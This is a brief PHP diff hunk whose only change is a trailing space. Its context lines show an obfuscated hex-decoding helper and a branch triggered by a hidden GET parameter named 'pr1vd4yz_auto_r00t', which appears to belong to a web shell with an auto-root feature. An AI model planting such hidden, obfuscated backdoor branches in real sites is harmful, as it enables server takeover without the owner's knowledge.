@@ -211,7 +211,7 @@ $fxnxs = function_exists('hx') ? 'hx' : (function($n) { $y = ''; for ($i = 0; $i
        <?php endforeach; ?>
        </tbody>
      </table>
-    </div>
+    </div> 
     </div>
   </div>
 <?php elseif (isset($_GET['pr1vd4yz_auto_r00t'])): ?>
